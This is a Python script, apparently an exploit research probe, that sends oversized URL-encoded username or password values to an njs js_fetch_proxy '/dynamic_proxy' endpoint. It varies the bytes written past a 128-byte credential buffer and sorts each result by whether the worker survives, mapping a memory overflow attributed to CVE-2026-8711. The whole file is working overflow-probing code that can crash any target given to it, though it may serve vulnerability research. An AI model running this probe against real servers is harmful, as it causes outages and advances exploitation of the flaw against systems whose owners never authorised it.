#!/usr/bin/env python3
"""Decoded-byte matrix for the njs js_fetch_proxy overflow oracle.

This is a remote-only research probe.  It varies the bytes written after the
fixed 128-byte credential buffer and classifies the externally visible result.
No target logs, procfs files, coredumps, debugger state, or container metadata
are consumed.
"""

from __future__ import annotations

import argparse
import time
from collections import Counter

from njs_fetch_proxy_keepalive_oracle import (
    body_sample,
    classify,
    healthy,
    keepalive_trial,
    parse_target,
)


def parse_int_list(value: str) -> list[int]:
    items: list[int] = []

    for part in value.split(","):
        part = part.strip()
        if not part:
            continue

        if "-" in part:
            start_s, end_s = part.split("-", 1)
            start, end = int(start_s, 0), int(end_s, 0)
            if end < start:
                raise argparse.ArgumentTypeError(f"invalid range {part!r}")
            items.extend(range(start, end + 1))
            continue

        items.append(int(part, 0))

    return items


def parse_byte_list(value: str) -> list[int]:
    bytes_out = parse_int_list(value)
    for byte in bytes_out:
        if byte < 0 or byte > 0xFF:
            raise argparse.ArgumentTypeError(f"byte out of range: {byte!r}")
    return bytes_out


def quote_bytes(data: bytes) -> str:
    return "".join(f"%{byte:02X}" for byte in data)


def credential(total_len: int, prefix_byte: int, overflow_byte: int) -> str:
    prefix_len = min(total_len, 128)
    overflow_len = max(0, total_len - prefix_len)
    data = bytes([prefix_byte]) * prefix_len + bytes([overflow_byte]) * overflow_len
    return quote_bytes(data)


def dynamic_path(
    field: str,
    total_len: int,
    prefix_byte: int,
    overflow_byte: int,
    base_user_len: int,
    base_pass_len: int,
) -> str:
    if field == "user":
        user = credential(total_len, prefix_byte, overflow_byte)
        password = quote_bytes(b"B" * base_pass_len)
    elif field == "pass":
        user = quote_bytes(b"A" * base_user_len)
        password = credential(total_len, prefix_byte, overflow_byte)
    else:
        raise ValueError(f"unsupported field: {field}")

    return f"/dynamic_proxy?u={user}&p={password}"


def result_status(value) -> str:
    if value is None:
        return "-"

    if value.status is not None:
        return str(value.status)

    return value.error or "closed"


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Remote-only decoded-byte matrix for CVE-2026-8711 liveness classes."
    )
    parser.add_argument("--target", default="127.0.0.1:19431", help="HOST:PORT or URL")
    parser.add_argument("--port", type=int, default=19431, help="fallback port")
    parser.add_argument("--field", choices=("user", "pass"), default="user")
    parser.add_argument(
        "--lengths",
        type=parse_int_list,
        default=parse_int_list("128,129,130,132,136,144,160,192,224,256,384,512"),
        help="decoded credential lengths, supports comma-separated ranges",
    )
    parser.add_argument(
        "--overflow-bytes",
        type=parse_byte_list,
        default=parse_byte_list("0x00,0x01,0x02,0x07,0x0a,0x0d,0x20,0x2f,0x3a,0x40,0x41,0x7f,0x80,0xff"),
        help="bytes to write after decoded offset 128",
    )
    parser.add_argument("--prefix-byte", type=lambda value: int(value, 0), default=0x41)
    parser.add_argument("--base-user-len", type=int, default=16)
    parser.add_argument("--base-pass-len", type=int, default=16)
    parser.add_argument("--timeout", type=float, default=2.5)
    parser.add_argument("--settle-delay", type=float, default=0.05)
    parser.add_argument("--between-delay", type=float, default=0.05)
    parser.add_argument("--repeat", type=int, default=1)
    parser.add_argument("--followup-path", default="/")
    parser.add_argument(
        "--show-sample",
        action="store_true",
        help="include first response body samples in the matrix output",
    )
    args = parser.parse_args()

    if args.prefix_byte < 0 or args.prefix_byte > 0xFF:
        parser.error("--prefix-byte must be 0..255")

    host, port = parse_target(args.target, args.port)

    print(f"target      {host}:{port}")
    print("scope       remote HTTP only; no file-read/procfs/log/core/debugger inputs")
    print(f"field       {args.field}")
    print(f"prefix      0x{args.prefix_byte:02x} repeated through decoded offset 127")
    print("classes     survived=second response; first-only=worker/connection died after first response")
    print("columns     len overflow first second fresh class count")

    if not healthy(host, port, args.timeout):
        print("preflight   failed")
        return 2

    summary: Counter[str] = Counter()

    for total_len in args.lengths:
        for overflow_byte in args.overflow_bytes:
            row_classes: Counter[str] = Counter()
            first_seen = ""
            second_seen = ""
            fresh_seen = ""
            sample = ""

            for _ in range(args.repeat):
                path = dynamic_path(
                    args.field,
                    total_len,
                    args.prefix_byte,
                    overflow_byte,
                    args.base_user_len,
                    args.base_pass_len,
                )
                first, second, _note = keepalive_trial(
                    host,
                    port,
                    path,
                    args.followup_path,
                    args.timeout,
                    args.settle_delay,
                )
                time.sleep(args.between_delay)
                fresh_ok = healthy(host, port, args.timeout)
                row_class = classify(first, second, fresh_ok)
                row_classes[row_class] += 1
                summary[row_class] += 1
                first_seen = result_status(first)
                second_seen = result_status(second)
                fresh_seen = "up" if fresh_ok else "down"
                sample = body_sample(first.body)

            class_text = ",".join(f"{name}:{count}" for name, count in sorted(row_classes.items()))
            line = (
                f"{total_len:<10} 0x{overflow_byte:02x}     {first_seen:<12} "
                f"{second_seen:<12} {fresh_seen:<5} {class_text:<28}"
            )

            if args.show_sample:
                line += f" {sample}"

            print(line)

    print("summary")
    for name, count in sorted(summary.items()):
        print(f"{name:<24} {count}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
